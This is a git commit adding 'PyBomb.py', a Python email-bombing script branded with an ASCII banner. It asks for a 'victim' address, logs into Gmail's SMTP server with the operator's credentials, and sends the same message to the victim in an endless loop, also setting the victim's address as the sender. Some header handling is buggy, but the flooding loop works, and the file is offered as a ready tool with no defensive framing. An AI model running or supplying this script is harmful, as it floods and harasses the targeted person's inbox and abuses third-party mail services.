049991dd45906891007b5c0f3c87df031e795301
Erdi Buğur <therdibgr@gmail.com>
2019-01-31 19:09:28 +0300

    PyBomb dosyası yüklendi...

---
+++ PyBomb.py
@@ -0,0 +1,34 @@
+import smtplib
+from email.mime.text \
+import MIMEText
+import winsound
+your_mail,your_password="yourmailadress@gmail.com",'password'
+figlet = """
+PPPPPP          BBBBB                      bb      
+PP   PP yy   yy BB   B   oooo  mm mm mmmm  bb      
+PPPPPP  yy   yy BBBBBB  oo  oo mmm  mm  mm bbbbbb  
+PP       yyyyyy BB   BB oo  oo mmm  mm  mm bb   bb 
+PP           yy BBBBBB   oooo  mmm  mm  mm bbbbbb  
+         yyyyy 				Created By ErdiBgr \n"""
+print(figlet)
+victimMail,subject = input('Mail Adress: '),input('Subject: ')
+message = """
+*-*-*-*-*-*-*-*-*-*-*-*-*-* <br>
+Your Messages <br>
+*-*-*-*-*-*-*-*-*-*-*-*-*-*
+"""
+mail = MIMEText(message, "html", "utf-8")
+mail["From"] = victimMail
+mail["Subject"] = subject
+mail["To"] = ",".join(victimMail)
+mail = mail.as_string()
+try:
+    server = smtplib.SMTP('smtp.gmail.com:587') 
+    server.starttls() 
+    server.login(your_mail, your_password)   
+    while True:
+    	server.sendmail(your_mail, victimMail, mail) 
+    	print ('Successful!')
+    	winsound.Beep(100,100)
+except:
+	print("Unsuccessful!")
